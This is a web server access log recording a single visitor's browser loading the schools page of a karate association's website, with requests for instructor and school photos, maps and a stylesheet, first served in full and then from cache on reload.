::ffff:136.24.141.37 - - [21/Aug/2022:05:07:41 +0000] "GET /images/instructors/geoffrey.jpg HTTP/1.1" 200 14922 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/grant.jpg HTTP/1.1" 200 14249 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/jorge8th.jpg HTTP/1.1" 200 121759 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/anthony.jpg HTTP/1.1" 200 14045 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/don.jpg HTTP/1.1" 200 76210 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/justin.jpg HTTP/1.1" 200 14091 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/clarkb.jpeg HTTP/1.1" 200 12183 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/herseybaker.jpg HTTP/1.1" 200 13988 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/anunley.jpg HTTP/1.1" 200 32690 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/rodnak.jpg HTTP/1.1" 200 12841 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/fortiz.jpg HTTP/1.1" 200 82719 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/dokeeffe.jpg HTTP/1.1" 200 42708 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/mlee.jpg HTTP/1.1" 200 65525 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/acohen.jpg HTTP/1.1" 200 62805 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/andrea.jpg HTTP/1.1" 200 61330 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/SenseiLarry.jpg HTTP/1.1" 200 60380 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/mbrooks.jpg HTTP/1.1" 200 132490 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/RuPaster.jpg HTTP/1.1" 200 75352 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/achang.jpg HTTP/1.1" 200 32799 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/amastroianni.jpg HTTP/1.1" 200 78389 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/fnavarro.jpg HTTP/1.1" 200 7268 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/amahalatinia.jpg HTTP/1.1" 200 84763 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/wkklogo.png HTTP/1.1" 200 35114 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/instructors/btimlin.jpg HTTP/1.1" 200 378054 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/alamedakaratedo.jpg HTTP/1.1" 200 86185 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/fbpic.webp HTTP/1.1" 200 986 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/igpic.webp HTTP/1.1" 200 1328 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/orindakaratedo.jpg HTTP/1.1" 200 264927 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/harborbaykaratedo.jpg HTTP/1.1" 200 77464 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/corpuzkaratedo.jpg HTTP/1.1" 200 65837 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/nunleykaratedo.jpg HTTP/1.1" 200 77040 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/dcakaratedo.jpg HTTP/1.1" 200 458708 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/marinkaratedo.jpeg HTTP/1.1" 200 104735 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/earhartkaratedo.jpg HTTP/1.1" 200 35835 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/zoomdonkaratedo.jpg HTTP/1.1" 200 32454 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/zoomsfbakaratedo.jpg HTTP/1.1" 200 259024 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/manzanitakaratedo.jpg HTTP/1.1" 200 1829058 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:42 +0000] "GET /images/schools/martinezkaratedo.jpg HTTP/1.1" 200 1754187 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /schools HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/jorge8th.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/arce.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/JohnPWKK.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/carlos.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/geoffrey.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/anthony.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/anunley.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/justin.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/herseybaker.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/clarkb.jpeg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/don.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/grant.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/rodnak.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/btimlin.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/fortiz.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/dokeeffe.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/acohen.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/andrea.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/mlee.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/mbrooks.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/SenseiLarry.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/RuPaster.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/achang.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/amastroianni.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/amahalatinia.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/fnavarro.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/instructors/wkklogo.png HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/alamedakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/fbpic.webp HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/igpic.webp HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/orindakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/dcakaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/harborbaykaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/corpuzkaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Aug/2022:05:07:45 +0000] "GET /images/schools/nunleykaratedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/schools" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
